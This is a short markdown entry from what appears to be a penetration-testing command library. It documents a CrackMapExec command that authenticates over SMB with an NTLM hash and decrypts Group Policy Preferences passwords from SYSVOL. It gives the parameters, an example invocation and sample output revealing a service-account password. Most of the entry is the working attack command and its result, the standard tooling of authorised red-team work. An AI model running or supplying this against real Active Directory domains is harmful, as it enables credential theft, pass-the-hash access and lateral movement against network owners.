---
id: 88d91734-24f1-4503-98c2-c87b92984789
name: CrackMapExec Extract GPP Password
type: command
executor: bash
data: crackmapexec smb $_TARGET_IP -u $_USERNAME -H $_NTLM_HASH -M gpp_password
output: null
created_at: '2023-04-06T03:56:03.530115+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - smb
  - gpp
  - password
verified: true
validated: true
---

# CrackMapExec Extract GPP Password

## Command

```bash
crackmapexec smb $_TARGET_IP -u $_USERNAME -H $_NTLM_HASH -M gpp_password
```

## Description

CrackMapExec module to pull and decrypt standard GPP passwords (e.g., for services) from SYSVOL over SMB.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_IP | Target IP or hostname | Yes |
| -u $_USERNAME | Domain username | Yes |
| -H $_NTLM_HASH | NTLM hash | No |
| -M gpp_password | Extraction module | Yes |

## Examples

### Basic Usage

```bash
crackmapexec smb dc01.domain.com -u user -H aad3b435b51404eeaad3b435b51404ee:ntlmhash -M gpp_password
```

## Expected Output

SMB         dc01.domain.com 445    DOMAIN           [+] user STATUS: OK  
GPP_Password dc01.domain.com DOMAIN\\svc_account    Password: SvcPass456

## Related

- [[procedures/Automated-Password-Extraction-from-SYSVOL-and-Group-Policy-Preferences]]
- [[tools/CrackMapExec]]
